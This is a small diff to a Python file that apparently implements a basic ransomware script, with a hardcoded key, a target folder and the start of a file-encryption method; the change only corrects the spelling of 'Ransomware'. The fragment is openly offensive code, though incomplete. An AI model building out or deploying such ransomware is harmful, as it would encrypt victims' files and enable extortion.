@@ -13,12 +13,12 @@
 import os
 from simplecrypt import encrypt
 
-path = '/root/Documents/Python/Ransonware/test'
+path = '/root/Documents/Python/Ransomware/test'
 clave = "test"
 class ransomware:
     
     def _init_(self):
-        print("Basic Ransonware")    
+        print("Basic Ransomware")    
 
     def cifrar(self, clave, file, fileout=None):
         if not fileout:
